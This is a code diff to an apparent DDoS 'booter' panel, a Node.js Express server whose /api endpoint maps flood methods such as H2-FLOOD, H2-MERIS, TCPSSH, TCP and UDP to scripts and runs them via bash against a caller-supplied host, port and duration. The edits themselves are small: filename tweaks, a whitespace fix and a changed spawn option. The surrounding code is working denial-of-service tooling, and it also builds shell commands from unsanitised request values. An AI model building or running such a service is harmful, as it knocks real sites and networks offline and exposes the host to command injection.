@@ -19,8 +19,8 @@ const methods = {
     H2MERIS: 'H2-MERIS.js',
     H2FLOOD: 'H2-FLOOD.js',
     TCPSSH: 'tcpssh.js',
-    TCP: 'tcp.c',
-    UDP: 'udp.c'
+    TCP: 'tcp',
+    UDP: 'udp'
 };
 
 const activeProcesses = new Map();
@@ -58,7 +58,7 @@ const generateCommand = (method, host, port, time) => {
         case 'TCPSSH':
             return `cd /root/methods && screen -dm node tcpssh.js ${host} ${port} root ${time}`;
         case 'UDP1':
-            return `cd /root/.methods &&  gcc udp.c -o udp && ./udp ${host} ${port} ${time}`;
+            return `cd /root/.methods && gcc udp.c -o udp && ./udp ${host} ${port} ${time}`;
         case 'TCP1':
             return `cd /root/.methods && gcc tcp.c -o tcp && ./tcp ${host} ${port} 3 ${time}`;
         default:
@@ -90,7 +90,7 @@ app.get('/api', (req, res) => {
     });
 
     const command = generateCommand(method, host, port, time);
-    const process = spawn('bash', ['-c', command], { detached: true, stdio: 'inherit' });
+    const process = spawn('bash', ['-c', command], { detached: true });
 
     process.stdout.on('data', (data) => {
         console.log(`Stdout: ${data}`);
